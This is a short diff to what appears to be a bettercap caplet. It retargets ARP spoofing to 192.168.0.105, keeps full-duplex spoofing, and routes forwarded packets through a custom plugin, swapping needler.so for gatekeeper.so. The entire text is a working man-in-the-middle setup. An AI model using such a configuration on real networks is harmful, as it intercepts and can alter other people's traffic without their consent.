@@ -1,9 +1,9 @@
-set arp.spoof.targets 192.168.0.102
+set arp.spoof.targets 192.168.0.105
 set arp.spoof.fullduplex true
 
 set packet.proxy.chain FORWARD
 set packet.proxy.queue.num 0
-set packet.proxy.plugin /home/pi/needler.so
+set packet.proxy.plugin /home/pi/gatekeeper.so
 
 arp.spoof on
 packet.proxy on
